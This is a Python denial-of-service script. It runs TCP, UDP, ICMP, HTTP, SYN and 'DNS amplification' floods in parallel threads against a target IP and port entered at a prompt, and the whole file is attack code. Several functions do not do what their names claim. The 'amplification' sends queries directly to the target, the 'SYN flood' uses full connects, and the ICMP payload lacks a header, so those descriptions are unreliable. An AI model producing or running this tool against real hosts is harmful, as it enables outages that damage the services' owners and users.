import socket
import random
import threading

def tcp_flood(target, port):
    """
    Perform TCP flood attack on the target.

    Args:
        target (str): The target IP address.
        port (int): The target port number.
    """
    while True:
        try:
            s_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_tcp.connect((target, port))
            packet_tcp = str(random.randint(0, 9999)) * random.randint(5, 20)
            s_tcp.sendto(packet_tcp.encode(), (target, port))
            s_tcp.close()
        except socket.error as e:
            print(f"TCP flood failed: {e}")

def udp_flood(target, port):
    """
    Perform UDP flood attack on the target.

    Args:
        target (str): The target IP address.
        port (int): The target port number.
    """
    while True:
        try:
            s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet_udp = str(random.randint(0, 9999)) * random.randint(5, 20)
            s_udp.sendto(packet_udp.encode(), (target, port))
            s_udp.close()
        except socket.error as e:
            print(f"UDP flood failed: {e}")

def icmp_flood(target, port):
    """
    Perform ICMP flood attack on the target.

    Args:
        target (str): The target IP address.
        port (int): The target port number.
    """
    while True:
        try:
            s_icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_icmp = str(random.randint(0, 9999)) * random.randint(5, 20)
            s_icmp.sendto(packet_icmp.encode(), (target, port))
            s_icmp.close()
        except socket.error as e:
            print(f"ICMP flood failed: {e}")

def http_flood(target, port):
    """
    Perform HTTP flood attack on the target.

    Args:
        target (str): The target IP address.
        port (int): The target port number.
    """
    while True:
        try:
            s_http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_http.connect((target, port))
            s_http.sendto(('GET /' + target + ' HTTP/1.1\r\n').encode(), (target, port))
            s_http.sendto(('Host: ' + target + '\r\n\r\n').encode(), (target, port))
            s_http.close()
        except socket.error as e:
            print(f"HTTP flood failed: {e}")

def syn_flood(target, port):
    """
    Perform SYN flood attack on the target.

    Args:
        target (str): The target IP address.
        port (int): The target port number.
    """
    while True:
        try:
            s_syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_syn.connect_ex((target, port))
        except socket.error as e:
            print(f"SYN flood failed: {e}")

def dns_flood(target, port):
    """
    Perform DNS amplification flood attack on the target.

    Args:
        target (str): The target IP address.
        port (int): The target port number.
    """
    while True:
        try:
            dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dns_query = bytearray.fromhex("AA AA 01 00 00 01 00 00 00 00 00 00 " \
                                          "03 77 77 77 05 64 6f 6f 6d 61 69 06 63 6f 6d 00 00 01 00 01")
            dns_sock.sendto(dns_query, (target, port))
            dns_sock.close()
        except socket.error as e:
            print(f"DNS flood failed: {e}")

def ddos_all(target, port):
    """
    Perform all DDOS attack methods simultaneously on the target.

    Args:
        target (str): The target IP address.
        port (int): The target port number.
    """
    threads = []

    t_tcp = threading.Thread(target=tcp_flood, args=(target, port))
    threads.append(t_tcp)
    t_tcp.start()

    t_udp = threading.Thread(target=udp_flood, args=(target, port))
    threads.append(t_udp)
    t_udp.start()

    t_icmp = threading.Thread(target=icmp_flood, args=(target, port))
    threads.append(t_icmp)
    t_icmp.start()

    t_http = threading.Thread(target=http_flood, args=(target, port))
    threads.append(t_http)
    t_http.start()

    t_syn = threading.Thread(target=syn_flood, args=(target, port))
    threads.append(t_syn)
    t_syn.start()

    t_dns = threading.Thread(target=dns_flood, args=(target, port))
    threads.append(t_dns)
    t_dns.start()

    for t in threads:
        t.join()

def main():
    """
    Main function to prompt user input and start DDOS attack.
    """
    try:
        target = input("Enter the target IP address: ")
        port = int(input("Enter the target port: "))
        
        ddos_all(target, port)
    except ValueError:
        print("Invalid port number. Please enter a valid integer port number.")

if __name__ == "__main__":
    main()